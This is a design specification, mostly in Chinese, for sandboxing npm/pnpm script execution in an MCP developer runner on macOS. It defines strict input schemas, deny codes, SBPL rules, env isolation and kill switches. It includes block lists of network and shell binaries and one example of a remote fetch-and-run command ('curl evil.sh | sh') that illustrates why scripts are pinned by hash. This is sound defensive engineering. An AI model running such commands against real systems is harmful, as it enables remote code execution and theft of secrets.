# P2 Process Sandbox 冻结设计文档

```
design_version      : 1.1 (frozen)
design_status       : FROZEN
frozen_date         : 2026-09-01
baseline_head       : 8f09cb17550207aa48c20a8484b91c4a13b05c68
baseline_version    : v1.1.0
target_version      : v2.0.0
baseline_branch     : mcp/p2-process-sandbox-v2
authority           : 本文件是 P2 阶段唯一设计权威来源，优先级高于任何聊天记录、口头约定与历史 PR 描述
scope               : 仅本文件；本阶段不修改 server.mjs / package.json / scripts/ / tests/
```

---

## 0. 阅读说明

### 0.1 本文档的地位

P2 阶段（让 `run_script` 在严格安全边界下执行经过人工审批、SHA-256 hash-pinned 的 npm/pnpm script）的设计**此前只存在于聊天记录中，从未落库**。这是一个流程缺陷。

自本文件冻结之日起：

| 角色 | 必须以本文档为准 |
| --- | --- |
| A1（设计核对） | 逐条核对本文档的不变式与字段表，发现偏差即报 BLOCKED |
| A3（实现） | 实现结果必须与本文档逐字段一致；任何偏离都是缺陷，不是"优化" |
| A4（审查） | 以本文档为审查基准，不接受"聊天里说过可以"作为依据 |

修改本文档需要显式解冻（新 design_version + 变更说明），**不允许在实现过程中就地改文档以迁就实现**。

### 0.2 断言标注约定

本文档中每一条事实性断言必须属于下列两类之一，不允许有第三类：

| 标注 | 含义 |
| --- | --- |
| **【已实测】** | 在本机真实复现过，且本文档给出了可复现命令或代码位置 |
| **【待 native gate 验证】** | 尚未在本机确认，必须由 native gate（原生 Terminal.app）实测后才能采信 |

**未验证的内容绝不允许写成已验证。** 见第 VI 部分「未决假设」。

### 0.3 术语

| 术语 | 含义 |
| --- | --- |
| SBPL | Sandbox Profile Language，macOS `sandbox_init` / `sandbox-exec` 使用的 TinyScheme 方言规则集 |
| Runner-managed worktree | 由本 runner 通过 `git worktree add` 创建并登记、带 `managedWorktree:true` 标记的读写工作区 |
| hash-pinned | 按脚本**内容**的 SHA-256 批准，而非按脚本名批准 |
| fail-closed | 任何支撑安全边界的子系统不可用时，拒绝执行并返回明确错误码，绝不降级为无保护执行 |
| native gate | 由**用户**在 macOS 原生 Terminal.app 中执行的真实 OS 沙箱验证环节 |
| RUNTIME_ROOT | `$HOME/.local/share/local-mcp-dev-runner` |
| SOURCE_ROOT | 本仓库检出目录 |

---

# I. P2 Process Sandbox Design Spec

## 1. 目标与非目标

### 1.1 目标（In Scope）

让 `run_script` 从 v1.0/v1.1.0 的**永久 DENY** 状态，转为在 OS 级进程沙箱内执行**经过人工审批、SHA-256 hash-pinned** 的 npm/pnpm script。

支持的典型脚本：`test`、`build`、`type-check`、`lint` 等**只读或仅写 worktree 内产物**的开发期脚本。

### 1.2 非目标（Out of Scope，明确排除）

| 非目标 | 说明 |
| --- | --- |
| 任意命令执行 | 不提供 `command` / `args` / `shell` 任何入口 |
| 依赖安装 | install 类脚本永久 DENY（见 8.5） |
| 网络访问 | 沙箱内网络恒为拒绝，且不接受任何放开请求 |
| 资源硬限制 | 不实现 RLIMIT（见 8.13） |
| 进程管理 API | 不新增 `abort_script` / `kill_script` 等工具 |
| 交互式会话 | 无 TTY、无 stdin、无交互提示 |
| 跨平台 | 本设计面向 macOS (`sandbox-exec`)；其他平台一律 `SANDBOX_BACKEND_UNAVAILABLE` |
| 后台常驻 | 每次调用是一个有界的前台执行，超时即杀 |

### 1.3 现状基线（v1.1.0，【已实测】）

| 事实 | 位置 | 证据 |
| --- | --- | --- |
| `server.mjs` 共 1465 行 | 仓库根 | `wc -l server.mjs` |
| 注册工具数恰好 22 | `server.mjs` | `grep -c '^server.registerTool($'` → 22 |
| `run_script` 永久 DENY | `server.mjs:1460` | `throw new Error("run_script is disabled in v1.0 security profile until an OS/process sandbox is added")` |
| `run_script` 当前 inputSchema 仅 `project` + `script` | `server.mjs:1446-1449` | 无 `network` / `timeoutSeconds` / `expectedPackageSha256` |
| `run_script` 当前 outputSchema 仅 5 字段 | `server.mjs:1450-1456` | `project` / `script` / `exitCode` / `stdout` / `stderr` |
| `project_scripts` 报告执行关闭 | `server.mjs:680-712` | `executionEnabled: false`，`reason` 常量 |
| 静态安全门禁只扫 `server.mjs` | `scripts/check-security-policies.mjs:65` | `readFile(path.join(PROJECT_ROOT, "server.mjs"))` |
| 静态门禁禁止 `spawn(` / `spawnSync` / `execSync` / `shell:true` | `scripts/check-security-policies.mjs:40-49` | `FORBIDDEN_CONSTRUCTS` |
| zod 版本 4.5.4 | `package.json` / `node_modules` | `node -p "require('zod/package.json').version"` |

**22 个工具名称集合（【已实测】，顺序按 `server.mjs` 注册顺序）**

```
list_projects        project_info        list_directory      find_files
search_text          read_file           read_files          file_info
create_directory     create_file         replace_text        delete_file
git_status           git_diff            git_log             git_branch_list
git_create_branch    git_worktree_create git_worktree_remove git_commit
project_scripts      run_script
```

### 1.4 zod v4 未知字段行为（【已实测】）

本机 `zod@4.5.4` 实测（复现方式见下）：默认 `z.object()` 会**静默剥离**未知字段，`.strict()` 才会报 `unrecognized_keys` 错误。

```bash
node --input-type=module -e "
import { z } from 'zod';
const loose  = z.object({ a: z.string() });
const strict = z.object({ a: z.string() }).strict();
console.log(loose.safeParse({a:'1',command:'rm'}));                 // success:true, command 被无声丢弃
console.log(strict.safeParse({a:'1',command:'rm'}).error.issues[0].code); // unrecognized_keys
"
```

**结论（不可变更）**：`run_script` 的 inputSchema **必须** `.strict()`。若不调用 `.strict()`，调用方传入的 `command` / `shell` / `args` 会被 zod 静默丢弃，表面上"请求被接受了"，实际上是一个**无声的安全语义错误**——调用方以为自己传了命令，runner 以为自己拒绝了命令。必须由显式错误替代静默剥离。

## 2. 执行模型总览

```
ChatGPT / Claude
   │  MCP over Secure MCP Tunnel（不可信输入）
   ▼
stdio MCP Runner (server.mjs)
   │
   ├─ 1. zod .strict() 解析输入          → 未知字段立即拒绝
   ├─ 2. kill switch 检查（双通道）       → KILL_SWITCH_ACTIVE
   ├─ 3. resolveProject                   → Unknown project
   ├─ 4. worktree 归属校验                → WORKTREE_NOT_MANAGED / NOT_WRITABLE / BRANCH_NOT_MCP
   ├─ 5. 敏感文件扫描（worktree 内）      → SENSITIVE_FILE_IN_WORKTREE
   ├─ 6. 包管理器判定                     → PACKAGE_MANAGER_UNSUPPORTED
   ├─ 7. script allowlist 校验            → SCRIPT_NOT_ALLOWLISTED
   ├─ 8. install 类脚本 DENY              → INSTALL_DENIED
   ├─ 9. TOCTOU Layer A（registry hash）  → SCRIPT_NOT_APPROVED / SCRIPT_VALUE_CHANGED
   ├─10. TOCTOU Layer B（执行前重读）     → SCRIPT_VALUE_CHANGED
   ├─11. TOCTOU Layer C（调用方 sha，可选）→ CALLER_SHA_MISMATCH
   ├─12. network 校验                     → NETWORK_NOT_NONE
   ├─13. obvious-deny 快筛                → EXECUTABLE_OBVIOUS_DENY
   ├─14. sandbox backend 可用性探测        → SANDBOX_BACKEND_UNAVAILABLE
   ├─15. 审计日志初始化                    → AUDIT_LOG_INIT_FAILED
   └─16. 沙箱内执行（隔离进程组 + 超时 + 升级终止）
          │                                → TIMEOUT / CANCELLED
          ▼
       输出处理（体积上限 / 截断 / ANSI 剥离 / redaction）
          │
          ▼
       structuredContent（对照 outputSchema）
```

**每一步都可能提前终止，且终止时一律 fail-closed。**

## 3. 模块划分

P2 引入的新源码文件**只允许**位于 `scripts/` 下并以 `sandbox-` 前缀命名，便于静态门禁按范围扫描。

| 文件 | 职责 | 是否允许使用 spawn |
| --- | --- | --- |
| `server.mjs` | 工具注册、策略编排、结构化输出 | **否** |
| `scripts/sandbox-policy.mjs` | 纯函数策略判定（allowlist / hash / install deny / network / PM 判定） | 否 |
| `scripts/sandbox-profile.mjs` | 生成 SBPL profile 文本 | 否 |
| `scripts/sandbox-audit.mjs` | 审计日志写入（0600、metadata only） | 否 |
| `scripts/sandbox-output.mjs` | 输出体积上限、截断、ANSI 剥离、redaction | 否 |
| `scripts/sandbox-process-runner.mjs` | **唯一**允许使用 `spawn` 的模块：隔离进程组、超时、SIGTERM/SIGKILL 升级、后代清理 | **是（见 Delta-1）** |

`server.mjs` 保持策略编排者的角色，不直接触碰进程创建。

> **与 as-built 实现的偏差**：上表是本设计规定的模块命名。实际并发实现中出现的模块名与本表不完全一致（`script-policy.mjs`、`audit-log.mjs`、`obvious-deny.mjs`、`output-handling.mjs`、`sensitive-worktree.mjs` 不带 `sandbox-` 前缀）。该偏差对**静态门禁扫描范围**有直接影响，已登记为冲突项 C1，见第 VIII 部分。在 C1 裁定前，扫描范围以「显式模块清单」为准，不得以 glob 前缀为唯一依据。

## 4. API 契约：`run_script`

### 4.1 输入字段表

| 字段 | 类型 | 必填 | 约束 | 违反时的处理 |
| --- | --- | --- | --- | --- |
| `project` | string | 是 | `min(1)`；必须是已注册项目名 | `Unknown project` |
| `script` | string | 是 | `min(1)`；必须在项目 allowlist 内且 hash 已批准 | `SCRIPT_NOT_ALLOWLISTED` / `SCRIPT_NOT_APPROVED` |
| `expectedPackageSha256` | string | 否 | 64 位小写 hex；Layer C 可选校验 | 不匹配 → `CALLER_SHA_MISMATCH` |
| `network` | `"none"` | 否 | **只能是字面量 `"none"` 或省略** | 其他任何值 → `NETWORK_NOT_NONE` |
| `timeoutSeconds` | integer | 否 | `1..600`，默认 `300`，整数 | 越界 → zod 校验失败 |

**schema 要求（不可变更）**：

```text
z.object({ ...上述字段... }).strict()
```

**零任意 shell API（不可变更）**：输入**不接受** `command` / `args` / `shell` / `exec` / `cwd` / `env` / `binary` / `executable` 中的任何一个。这些字段名的出现（无论来自调用方还是未来实现者的"便利扩展"）都是**设计违规**，不是功能增强。

**`network` 拒绝清单（不可变更）**：`local` / `internet` / `full` / `true` / 布尔值 / 任意其他字符串 → 一律 `NETWORK_NOT_NONE`。不接受"只开本地回环"这类看似合理的放宽。

### 4.2 输出字段表

| 字段 | 类型 | 说明 |
| --- | --- | --- |
| `project` | string | 项目名 |
| `script` | string | 被执行的脚本名 |
| `packageManager` | string | `npm` 或 `pnpm` |
| `packageSha256` | string | 执行前最后一次读到的 `package.json` 内容 SHA-256 |
| `scriptSha256` | string | 该 script 命令字符串的内容 SHA-256 |
| `network` | string | 恒为 `"none"` |
| `startedAt` | string | ISO 8601 开始时间 |
| `endedAt` | string | ISO 8601 结束时间 |
| `durationMs` | integer | 执行耗时（毫秒） |
| `exitCode` | integer \| null | 子进程退出码；被信号杀死时为 `null` |
| `signal` | string \| null | 终止信号（如 `"SIGKILL"`）；正常退出为 `null` |
| `timedOut` | boolean | 是否因超时被终止 |
| `cancelled` | boolean | 是否因 kill switch 中途触发被终止 |
| `stdout` | string | 处理后的标准输出 |
| `stderr` | string | 处理后的标准错误 |
| `stdoutTruncated` | boolean | stdout 是否被截断 |
| `stderrTruncated` | boolean | stderr 是否被截断 |

### 4.3 语义要点（不可变更）

**被测脚本返回非零退出码，仍属成功的 MCP 调用（`isError=false`）。**

这是本设计最容易被误解的一条。示例：项目 `test` 脚本失败（`exitCode=1`），这是一次**完全成功**的 `run_script` 调用——runner 忠实地在沙箱里跑了测试，并且测试确实失败了。测试失败是**被测代码的信号**，不是 runner 的故障。

只有下列情形才是 `isError=true`：

| 情形 | 性质 |
| --- | --- |
| policy 拒绝（allowlist / hash / install / network / worktree / PM 等） | 调用未被授权执行 |
| sandbox 失败（`SANDBOX_BACKEND_UNAVAILABLE` 等） | 安全边界无法建立 |
| 审计日志初始化失败（`AUDIT_LOG_INIT_FAILED`） | 可审计性无法保证 |

**`TIMEOUT` 与 `CANCELLED` 的裁定（本文档明确裁定）**：二者属于**执行终止结果**，不属于 policy 失败或 sandbox 失败——脚本确实在沙箱内被安全执行了，只是没有跑完。因此：

- `reason` 字段填 `TIMEOUT` / `CANCELLED`；
- 对应的 `timedOut` / `cancelled` 布尔置位；
- MCP 层仍为 `isError=false`；
- `exitCode` 为 `null`，`signal` 记录终止信号。

这样调用方可以用 `timedOut`/`cancelled` 做机器判断，同时不会把"超时"误报成"runner 出错"。

## 5. API 契约：`project_scripts`

### 5.1 向后兼容要求（不可变更）

`project_scripts` **必须保留全部旧字段**，不允许删除或改名。旧字段为：`project`、`packageManager`、`scripts`、`allowedScripts`、`executionEnabled`、`reason`。

### 5.2 新增字段表

| 新增字段 | 类型 | 说明 |
| --- | --- | --- |
| `packageSha256` | string | 当前 `package.json` 内容 SHA-256，供调用方填写 `expectedPackageSha256` |
| `deniedScripts` | string[] | 命中 install 类 DENY 的脚本名 |
| `executionSupported` | boolean | 当前平台/上下文是否**可能**支持执行（与 `executionEnabled` 区分：后者含 kill switch 状态） |
| `killSwitchActive` | boolean | kill switch 双通道中任一通道处于激活态 |
| `scriptHashes` | object | `scriptName -> sha256` 映射，供人工审批 hash-pinning 使用 |
| `hashMatches` | boolean | `scriptHashes` 与 registry 中已批准的 `scriptHashes` 是否一致 |
| `sensitiveFilesInWorktree` | string[] | worktree 内检出的敏感文件（相对路径），非空则 `run_script` 拒绝 |
| `reason` | string | 保留旧字段；补充说明当前不可执行的原因 |

`executionSupported` 与 `executionEnabled` 的区分是刻意的：前者回答"这个环境理论上能不能跑"，后者回答"现在这一刻能不能跑"。让调用方能区分"环境不支持"与"被管理员临时关掉"。

## 6. Deny reason 码表（完整）

| # | reason 码 | 触发条件 | isError |
| --- | --- | --- | --- |
| 1 | `SANDBOX_BACKEND_UNAVAILABLE` | `sandbox-exec` 不可用、非 macOS、或 backend 自检失败 | true |
| 2 | `NETWORK_NOT_NONE` | `network` 字段不是 `"none"` 且未省略 | true |
| 3 | `RUN_SCRIPTS_DISABLED` | 全局开关关闭（`run_script` 能力未启用） | true |
| 4 | `KILL_SWITCH_ACTIVE` | 文件通道或环境变量通道任一激活 | true |
| 5 | `WORKTREE_NOT_MANAGED` | 目标不是 runner-managed worktree（缺 `managedWorktree:true`） | true |
| 6 | `WORKTREE_NOT_WRITABLE` | 目标 worktree 的 `write` 不为 `true` | true |
| 7 | `WORKTREE_BRANCH_NOT_MCP` | worktree 当前分支不以 `mcp/` 开头 | true |
| 8 | `SCRIPT_NOT_ALLOWLISTED` | 脚本名不在项目 allowlist 内 | true |
| 9 | `SCRIPT_NOT_APPROVED` | 脚本 hash 未在 registry 的 `scriptHashes` 中获批 | true |
| 10 | `SCRIPT_VALUE_CHANGED` | 执行前重读发现脚本内容 hash 与批准值不符（TOCTOU Layer A/B） | true |
| 11 | `CALLER_SHA_MISMATCH` | 调用方 `expectedPackageSha256` 与实际不符（TOCTOU Layer C） | true |
| 12 | `PACKAGE_MANAGER_UNSUPPORTED` | 非 npm / pnpm（含 yarn、bun、workspace、无法判定） | true |
| 13 | `INSTALL_DENIED` | 脚本名或内容命中 install 类拒绝清单 | true |
| 14 | `EXECUTABLE_OBVIOUS_DENY` | 脚本内容命中 obvious-deny 快筛（危险 binary） | true |
| 15 | `SENSITIVE_FILE_IN_WORKTREE` | worktree 内存在敏感文件 | true |
| 16 | `AUDIT_LOG_INIT_FAILED` | 审计日志无法创建或权限无法设为 0600 | true |
| 17 | `TIMEOUT` | 超过 `timeoutSeconds` 被终止 | false（执行终止） |
| 18 | `CANCELLED` | 执行期间 kill switch 被触发 | false（执行终止） |

## 7. 沙箱设计

### 7.1 后端

| 平台 | 后端 | 可用性 |
| --- | --- | --- |
| macOS | `/usr/bin/sandbox-exec` + SBPL profile | 取决于执行上下文（见第 IV 部分能力梯度） |
| 其他 | 无 | 恒 `SANDBOX_BACKEND_UNAVAILABLE` |

### 7.2 SBPL profile 骨架（结构说明，非实现代码）

profile 采用 **deny-default** 基调，只包含以下规则族：

| 规则族 | 内容 |
| --- | --- |
| version | `(version 1)` |
| 默认 | deny default |
| 必需进程执行 | 允许 `node` 安装前缀、`/bin`、`/usr/bin` 下的进程执行 |
| 文件读取 | 允许 worktree 路径、`node_modules`、node 运行时前缀、沙箱 HOME/TMP |
| 文件写入 | 仅允许 worktree 内 + 沙箱 TMP + npm 缓存目录（沙箱内私有） |
| 网络 | **全部拒绝**（无 `network-outbound` / `network-inbound` 放行规则） |
| 危险 binary | 显式 deny `process-exec*`（见 7.4） |
| git | 显式 deny 全部 git 相关执行 |

### 7.3 环境变量隔离（不可变更）

**父进程 env 不透传。** 子进程只获得一个 allowlist-only 的最小环境：

| 允许项 | 说明 |
| --- | --- |
| `PATH` | 固定值，只含受控目录 |
| `HOME` | 指向沙箱私有 HOME（不是用户真实 HOME） |
| `TMPDIR` | 指向沙箱私有临时目录 |
| `NODE_ENV` | 可选 |
| npm/pnpm 运行必需的最小变量 | 逐项列举，不通配 |

**直接后果（不可变更）**：子进程**看不到宿主 secrets**。`OPENAI_API_KEY`、`GITHUB_TOKEN`、`AWS_*`、npm `_authToken` 等一律不可见。这条比 redaction 更根本——**拿不到就不会泄露**。

### 7.4 沙箱内禁止项（不可变更）

| 类别 | 清单 |
| --- | --- |
| 危险 binary | `curl`、`wget`、`ssh`、`scp`、`sftp`、`nc`、`osascript`、`security`、`launchctl`、`sudo`、`docker`、`podman` |
| 版本控制 | `git`（沙箱内禁止任何 git 操作） |

### 7.5 规则顺序常量 `EXEC_RULE_ORDER`（不可变更其"必须存在且可被验证"这一性质）

SBPL 中 `(allow process-exec* (subpath "/usr/bin"))` 与 `(deny process-exec* (literal "/usr/bin/curl"))` 同时命中时谁生效，**尚未在本机实测确认**（见第 VI 部分）。

因此：

- 规则顺序必须是**具名常量** `EXEC_RULE_ORDER`，不允许散落在 profile 生成代码中；
- 默认取「先 allow 必需路径、后 deny 危险 binary」的顺序；
- **该顺序必须由 native gate 用真实 OS 行为验证**；
- 若验证不通过，**报 BLOCKED**，**不得**通过放宽 profile（例如改成只 allow 白名单 binary 而放弃 deny 规则以外的手段）来绕过。

## 8. 安全原则（逐条冻结，标注不可变更）

以下每一条均为**不可变更**。实现者若认为某条需要改动，正确做法是**停下并上报 BLOCKED**，而不是自行调整。

### 8.1 工具数量恒为 22（不可变更）

不新增、不删除、不改名。`tools/list` 必须返回恰好 22 个工具，名称集合与 1.3 节清单精确相等。

**明确禁止新增的工具**（这些需求在实现过程中会被反复提出，此处一次性否决）：

`abort_script`、`sandbox_run`、`run_command`、`approve_script`、`configure_network`

理由：每新增一个工具就扩大一次攻击面，而上述每一个都可以用现有 22 个工具或直接人工配置替代。

### 8.2 零任意 shell API（不可变更）

见 4.1。`command` / `args` / `shell` / `exec` / `cwd` / `env` / `binary` / `executable` 均不接受。

### 8.3 network 只能 `none`（不可变更）

拒绝 `local` / `internet` / `full` / `true` / 任意字符串。

理由："只开本地回环"听起来安全，但本机可能正跑着带未授权接口的本地服务（数据库、Redis、Docker socket、本机其他 MCP server）。拒绝所有网络比区分"好的网络"和"坏的网络"更简单也更可靠。

### 8.4 包管理器白名单（不可变更）

| 判定结果 | 处理 |
| --- | --- |
| `npm` | 允许 |
| `pnpm` | 允许 |
| `yarn` | `PACKAGE_MANAGER_UNSUPPORTED` |
| `bun` | `PACKAGE_MANAGER_UNSUPPORTED` |
| workspace（monorepo 多包） | `PACKAGE_MANAGER_UNSUPPORTED` |
| 无法判定 | `PACKAGE_MANAGER_UNSUPPORTED` |

### 8.5 install 类永久 DENY（不可变更）

以下脚本名或内容模式一律 `INSTALL_DENIED`：

```
install          npm install      pnpm install     npm i
pnpm add         npm exec         npx              preinstall
postinstall      prepare          publish          prepublish
prepublishOnly
```

理由：安装意味着从网络拉取并执行第三方生命周期脚本（`postinstall` 等）。这与"沙箱无网络"直接冲突，且把不可信的远端代码引入了执行路径。

### 8.6 执行地点限制（不可变更）

**只能在 Runner-managed READ_WRITE worktree 内执行。**

| 位置 | 处理 |
| --- | --- |
| Runner-managed worktree（`managedWorktree:true` + `write:true` + `mcp/*` 分支） | 允许 |
| 原始仓库（READ_ONLY） | `WORKTREE_NOT_MANAGED` |
| 普通可写沙箱目录 | `WORKTREE_NOT_MANAGED` |
| 手工创建的 worktree | `WORKTREE_NOT_MANAGED` |
| 任意已注册目录（非 runner 创建） | `WORKTREE_NOT_MANAGED` |

这不是形式主义：managed worktree 是**唯一**一个"内容损坏不会造成不可逆损失"的地方（可用 `git` 丢弃、可用 `git_worktree_remove` 整体移除）。

### 8.7 script allowlist 强制 + script hash 强制（不可变更）

- 脚本名必须在项目 allowlist 内 → 否则 `SCRIPT_NOT_ALLOWLISTED`
- 脚本**内容**的 SHA-256 必须在 registry 的 `scriptHashes` 中获批 → 否则 `SCRIPT_NOT_APPROVED`

**按内容 hash 而非脚本名批准**是 P2 的核心。仅按脚本名批准的 allowlist 可被"改一行 `package.json`"绕过：把 `test` 从 `vitest` 改成 `curl evil.sh | sh`，名字没变，语义全变。

### 8.8 TOCTOU 分层（不可变更）

| 层 | 内容 | 强制性 |
| --- | --- | --- |
| **Layer A** | registry 中记录的 `scriptHashes`，执行前比对 | **必选** |
| **Layer B** | 执行前**重读** `package.json`，重新计算并比对 hash | **必选** |
| **Layer C** | 调用方传入 `expectedPackageSha256`，与重读结果比对 | **可选**（传了才校验） |

Layer A 与 Layer B 缺一不可：A 是"批准了什么"，B 是"现在磁盘上是什么"。只有两者都比对，才能覆盖"批准之后、执行之前被改写"的窗口。

### 8.9 禁止 unsandboxed fallback（不可变更）

**不存在**"沙箱不可用就退化为直接执行"的代码路径。沙箱不可用 → `SANDBOX_BACKEND_UNAVAILABLE` → 拒绝。

任何形式的 fallback（"先试试沙箱，失败了直接跑"、"本地开发模式跳过沙箱"、`NODE_ENV=development` 特例）都是**严重安全缺陷**。

### 8.10 kill switch 双通道（不可变更）

| 通道 | 形式 | 生效时机 |
| --- | --- | --- |
| 文件通道 | `$RUNTIME_ROOT/run-script.kill` 存在即激活 | 每次调用前检查 + 执行中轮询 |
| 环境变量通道 | `RUN_SCRIPT_KILL_SWITCH=on` | 每次调用前检查 |

要求**秒级生效**：执行期间按短间隔轮询两个通道，命中则立即终止进程组。

双通道的意义：文件通道给"运维/人"（不需要重启进程），环境变量通道给"编排系统"（cloudflared/LaunchAgent 场景下重启成本高）。

**恢复语义**：删除 `$RUNTIME_ROOT/run-script.kill`（文件通道）并将 `RUN_SCRIPT_KILL_SWITCH` 置为非 `on` 或取消设置（环境变量通道）后，能力恢复。**两个通道必须同时解除**才恢复；任一通道仍激活则继续拒绝。恢复后 `project_scripts` 的 `killSwitchActive` 应回到 `false`。

### 8.11 不实现 hard RLIMIT（不可变更）

**禁用** `setrlimit`、禁用 `ulimit` shell hack、禁用 native helper 做资源限制。

理由：`ulimit` shell hack 需要 shell，与 8.2 冲突；`setrlimit` 需要 native 模块或子进程包装，与"最小实现面"冲突。

**后果**：无法硬限制 CPU / 内存 / 磁盘写入量。此残余风险必须写入 `SECURITY.md`（见第 VII 部分）。缓解手段只有 `timeoutSeconds` + 进程组终止。

### 8.12 redaction 不是安全边界（不可变更）

**redaction 只是输出卫生。**

真正的安全边界是这四者：

1. **SBPL**（进程/文件系统/网络规则）
2. **env 隔离**（子进程看不到 secrets）
3. **文件系统隔离**（deny-default + worktree 限定）
4. **网络拒绝**（无任何放行规则）

redaction 是在已经假设"边界可能被突破"的前提下，降低日志/输出中偶然出现敏感串的危害。**绝不允许把 redaction 当作阻止数据外泄的手段。** 若一个 secret 能被脚本读到，redaction 只是让它在输出里看起来像 `[REDACTED]`——它已经泄露了。

### 8.13 obvious-deny 不是安全边界（不可变更）

obvious-deny（对脚本内容做危险 binary 快筛）只做 **fail-fast**：在昂贵的沙箱启动之前，把明显违规的请求挡掉，节省资源并给出清晰错误。

它**不是**安全边界。真正的边界是 SBPL。脚本内容可以被编码、拼接、间接调用等方式绕过字符串快筛——这没关系，因为 SBPL 不依赖字符串匹配。

### 8.14 审计日志（不可变更）

| 属性 | 值 |
| --- | --- |
| 路径 | `$RUNTIME_ROOT/logs/run-script.log` |
| 权限 | `0600` |
| 内容 | **只记 metadata**，不记 stdout/stderr 全文 |
| 初始化失败 | **fail-closed** → `AUDIT_LOG_INIT_FAILED` |

记录的 metadata 至少包括：时间戳、项目名、脚本名、`packageSha256`、`scriptSha256`、`network`、`timeoutSeconds`、reason 码、耗时、exit code / signal。

**不记 stdout/stderr 全文**是刻意的：脚本输出可能包含敏感业务数据，且体积不可控。审计日志回答"谁在什么时候跑了什么、结果如何"，不回答"输出了什么"。

**fail-closed 的理由**：审计是 P2 可问责性的基础。如果一次执行无法被记录，那它就不应该被执行。

## 9. 输出处理（不可变更）

| 处理项 | 规则 |
| --- | --- |
| 体积上限 | 每个流（stdout / stderr）**256 KB** |
| 截断策略 | **头尾保留**：保留开头与结尾各若干，中间丢弃，避免"最有价值的错误在末尾但被砍掉" |
| 截断标记 | 注入显式标记，并置对应 `stdoutTruncated` / `stderrTruncated` 为 `true` |
| 单行限制 | 单行超过阈值时截断，防止单行极大值撑爆解析 |
| ANSI 剥离 | 移除 ANSI 转义序列（颜色/光标控制） |
| redaction | 敏感串替换为占位符（**卫生措施，非安全边界**，见 8.12） |

头尾保留而非简单从头截取，是因为构建/测试输出的关键信息（失败摘要、错误堆栈）几乎总在末尾。

## 10. TOCTOU 残余风险声明（不可变更）

**`TOCTOU_V2_RESIDUAL`：Layer A + Layer B 并未完全消除 race。**

Layer B 在"执行前重读"，但重读那一刻与 `sandbox-exec` 真正读取 `package.json` 那一刻之间仍存在时间窗口。攻击者若能在该窗口内改写文件，仍可能让执行内容与批准内容不同。

**明确禁止的方案**：不允许用 "inode 校验" / "`fstat` 比较" / "打开 fd 后比较" 之类的手段声称"彻底解决了 TOCTOU"。这些手段**缩小**了窗口，但没有**消除**它，而缩小窗口带来的复杂度与虚假安全感得不偿失。

**正确的姿态**：承认残余风险，把它写进 `SECURITY.md`，并用其他层（沙箱本身、禁止 unsandboxed fallback、审计日志）来控制后果。

---

# II. Design Repair Delta

本章记录相对**原设计**（仅存在于聊天记录中的版本）所做的修改，以及每条修改的动因。

## Delta-1：spawn 冲突裁定

### 问题

原设计的静态 tripwire（`scripts/check-security-policies.mjs:40-49`）禁止 `child_process` 的 `spawn` / `exec` / `execSync` / `shell: true`。

但 P2 的 **process-group lifecycle** 需要 spawn 的 `detached` 能力：

| 需求 | 为什么必须要 `detached` spawn |
| --- | --- |
| 隔离进程组 | 需要 `detached: true` 让子进程自成一个进程组，才能整体发信号 |
| 超时终止 | 需要持有 pid 并在超时后向**进程组**发 `SIGTERM` |
| SIGTERM → SIGKILL 升级 | 需要两阶段信号发送能力 |
| 后代清理 | 脚本会拉起孙进程（如 vitest workers），必须杀掉整棵进程树，不能只杀直接子进程 |

`execFile`（v1.x 现有工具全部使用它）无法提供进程组控制。

### 裁定（不可变更）

**允许在唯一一个底层模块 `scripts/sandbox-process-runner.mjs` 内使用 `spawn`，前提是同时满足：**

| 约束 | 内容 |
| --- | --- |
| 唯一性 | 全仓库 P2 源码中，**只有** `scripts/sandbox-process-runner.mjs` 允许出现 `spawn` |
| 无 shell | 不得使用 `shell: true` |
| 无 exec 族 | 不得使用 `exec` / `execSync` / `spawnSync` |
| argv 结构化 | 参数以数组传递，不做字符串拼接 |
| 可执行文件 | 固定常量，或经解析校验后才使用 |
| stdio | 全部 `pipe`（不继承宿主 stdio，不给 `inherit`） |
| detached | `detached: true`（这是本豁免存在的唯一理由） |

### 配套要求 A：静态门禁必须扩展扫描范围

**不得靠"把危险 API 藏进 scripts 目录"来逃避审查。**

当前 `scripts/check-security-policies.mjs:65` 只读取 `server.mjs`。这意味着任何放进 `scripts/` 的危险构造**完全不被扫描**。

**要求（不可变更）**：静态门禁的扫描范围扩展到**全部 P2 源码**：

```
server.mjs
scripts/sandbox-*.mjs
scripts/ 下全部 P2 新增模块（按显式清单枚举）
```

**关键补充（不可变更）**：扫描目标必须是**显式枚举的模块清单**，不能只依赖 `sandbox-*.mjs` 这类 glob 前缀。

理由：若只按前缀扫描，则任何不满足命名约定的 P2 源码都会**整体逃出安全扫描**——这正是本节开头要防止的「把危险 API 藏进 scripts 目录」问题，只是换成了「把危险 API 藏进一个不匹配前缀的文件名」。glob 前缀可以作为**辅助手段**（用于捕捉清单遗漏的新文件），但不能作为唯一依据。

**扫描模型**：默认禁止 `spawn` / `exec` / `execSync` / `spawnSync` / `shell:true`；唯一例外模块是 `scripts/sandbox-process-runner.mjs`，且该例外受下一节的结构性不变式约束。

### 配套要求 B：process-runner 结构性不变式断言

对 `scripts/sandbox-process-runner.mjs` 增加**结构性不变式断言**（作为 gate 的一部分，不是注释）：

| # | 不变式 |
| --- | --- |
| 1 | `spawn` 在全文中**仅出现一处** |
| 2 | 全文中**无** `shell: true` |
| 3 | 全文中**无**字符串拼接构造 argv（argv 必须是字面量数组或由常量与校验过的变量组成） |
| 4 | `stdio` 三个流全部为 `pipe` |
| 5 | `detached` 为 `true` |

任一不变式不成立即 gate 失败。这保证"豁免一个模块"不会悄悄退化成"豁免一种写法"。

## Delta-2：真实执行环境归属变更

### 问题

原设计要求在实现环境内跑真实的 `sandbox-exec` 验证。但该环境是 WorkBuddy（AI 宿主）进程树，在其中调用 `sandbox-exec` **恒定失败**（详见第 IV 部分）。这会导致：

- 要么 gate 永远无法 PASS；
- 要么实现者为了"让 gate 变绿"而伪造/跳过真实验证——**得到假 PASS**。

### 裁定（不可变更）

| 项 | 原设计 | 新设计 |
| --- | --- | --- |
| REAL sandbox gate 执行者 | 实现环境（WorkBuddy） | **用户在 macOS 原生 Terminal.app 中执行** |
| A3 提供物 | — | **一键脚本**（用户在原生 Terminal 里运行即可） |
| A3 完成条件 | `P2_IMPLEMENTATION=PASS` | **`P2_IMPLEMENTATION=PASS_PENDING_NATIVE_GATE`** |

`PASS_PENDING_NATIVE_GATE` 的含义：源码实现与全部可在受限环境内运行的 gate 均已通过，但真实 OS 沙箱行为**尚未**被验证。这是一个**诚实的中态**，不允许把它简写成 `PASS`。

## Delta-3：设计正式落库

### 问题

设计只存在于聊天记录，不可检索、不可 diff、不可回溯，且随会话上下文丢失而失真。

### 裁定（不可变更）

